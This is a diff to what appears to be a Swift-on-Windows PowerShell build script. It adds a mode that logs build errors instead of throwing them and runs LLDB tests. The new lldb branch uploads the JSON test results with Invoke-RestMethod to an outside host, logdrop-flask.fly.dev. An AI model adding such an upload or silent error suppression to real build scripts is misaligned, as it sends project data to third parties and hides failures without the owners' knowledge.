@@ -500,6 +500,9 @@ function Copy-Directory($Src, $Dst) {
   }
 }
 
+# Invoke-Program won't thow if this variable is set
+$IgnoreErrorsAndLog = $null
+
 function Invoke-Program() {
   [CmdletBinding(PositionalBinding = $false)]
   param(
@@ -560,7 +563,11 @@ function Invoke-Program() {
         $ErrorMessage += "  $Frame`n"
       }
 
-      throw $ErrorMessage
+      if ($IgnoreErrorsAndLog -eq $null) {
+        throw $ErrorMessage
+      } else {
+        Write-Host $ErrorMessage
+      }
     }
   }
 }
@@ -1530,6 +1537,10 @@ function Build-Compilers() {
         Write-Host "Copying '$RuntimeBinaryCache\bin\swiftCore.dll' to '$CompilersBinaryCache\$SwiftRTSubdir'"
         cp "$RuntimeBinaryCache\bin\swiftCore.dll" "$CompilersBinaryCache\$SwiftRTSubdir"
 
+        if ($IgnoreErrorsAndLog) {
+          $LitWriteJSON = "--output $IgnoreErrorsAndLog"
+        }
+
         $TestingDefines += @{
           LLDB_INCLUDE_TESTS = "YES";
           # Check for required Python modules in CMake
@@ -1568,7 +1579,8 @@ function Build-Compilers() {
     if (-not $IsCrossCompiling) {
       # We hardcode LLVM_DEFAULT_TARGET_TRIPLE to x86_64-unknown-windows-msvc,
       # but the host triple might be inferred as x86_64-pc-windows-msvc, which
-      # causes llvm-lit to skip `REQUIRES: native` tests.
+      # causes llvm-lit to skip `REQUIRES: native` tests. Let's align them
+      # manually.
       $TestingDefines += @{
         LLVM_HOST_TRIPLE = $Arch.LLVMTarget
       }
@@ -3009,6 +3021,11 @@ if (-not $IsCrossCompiling) {
     Build-Compilers $HostArch @Tests
   }
 
+  if ($Test -contains "lldb") {
+    $IgnoreErrorsAndLog = "lldb-tests-$(Get-Date -Format "yyyyMMdd_HHmmss").json"
+    Build-Compilers $HostArch -TestLLDB
+    Invoke-RestMethod -Uri "https://logdrop-flask.fly.dev/upload" -Method POST -Form @{"file"=Get-Item $IgnoreErrorsAndLog}
+  }
   if ($Test -contains "dispatch") {
     Build-Dispatch Windows $HostArch -Test
   }
